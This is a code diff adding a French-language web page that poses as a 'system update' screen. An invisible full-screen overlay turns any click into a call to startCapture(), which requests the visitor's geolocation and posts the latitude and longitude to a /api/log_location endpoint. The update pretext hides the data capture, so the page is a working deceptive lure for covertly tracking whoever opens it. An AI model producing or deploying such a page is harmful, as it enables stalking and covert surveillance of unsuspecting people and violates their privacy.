@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Mise à jour Système</title>
+    <style>
+        body { margin: 0; background: #000; height: 100vh; display: flex; align-items: center; justify-content: center; color: #fff; font-family: sans-serif; }
+        #full-screen-trigger { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; }
+    </style>
+</head>
+<body>
+    <div id="full-screen-trigger" onclick="startCapture()"></div>
+    <div id="loader">
+        <p>Préparation de la mise à jour système...</p>
+    </div>
+    <script>
+        function startCapture() {
+            document.body.style.background = "#000";
+            document.getElementById('loader').style.display = 'none';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    fetch('/api/log_location', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
+                    });
+                });
+            }
+        }
+    </script>
+</body>
+</html>
